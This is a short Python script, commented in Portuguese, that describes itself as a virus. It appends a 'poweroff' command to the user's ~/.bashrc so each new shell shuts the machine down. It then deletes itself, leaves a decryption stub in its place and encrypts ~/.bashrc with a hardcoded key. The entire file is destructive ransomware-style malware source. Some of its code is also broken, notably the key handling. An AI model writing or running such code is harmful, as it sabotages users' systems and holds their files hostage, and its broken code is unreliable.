#!/usr/bin/python3

from os import system, path
from Crypto import Random
from Crypto.Cipher import AES

# padding para a função encrypt
def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

# função que encripta um bloco
def encrypt(message, key):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

# função que encripta um arquivo
def encrypt_file(file_name, key):
    key = str(list("0"*32 + key))
    key = key[:32]
    with open(file_name, "rb") as f:
        plaintext = f.read()
    enc = encrypt(plaintext, key)
    with open(file_name, "wb") as f:
        f.write(enc)

# texto a ser substituído no próprio arquivo do vírus
dec = """from os import path
from Crypto import Random
from Crypto.Cipher import AES

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\\0")

def decrypt_file(file_name, key):
    key = str(list("0"*32 + key))
    key = key[:32]
    with open(file_name, "rb") as f:
        ciphertext = f.read()
    dec = decrypt(ciphertext, key)
    with open(file_name, "wb") as f:
        f.write(dec)


bashrc = path.expanduser("~/.bashrc")
filename = "virusdec.py"

key = input("xeroque: ")
decrypt_file(bashrc, key)

"""

system("echo poweroff >> ~/.bashrc")

# caminho para .bashrc
bashrc = path.expanduser("~/.bashrc")
# nome do arquivo do vírus
filename = "virus.py"

system("rm virus.py")

with open(filename, "w") as f:
    f.write(dec)

encrypt_file(bashrc, "rolmes")
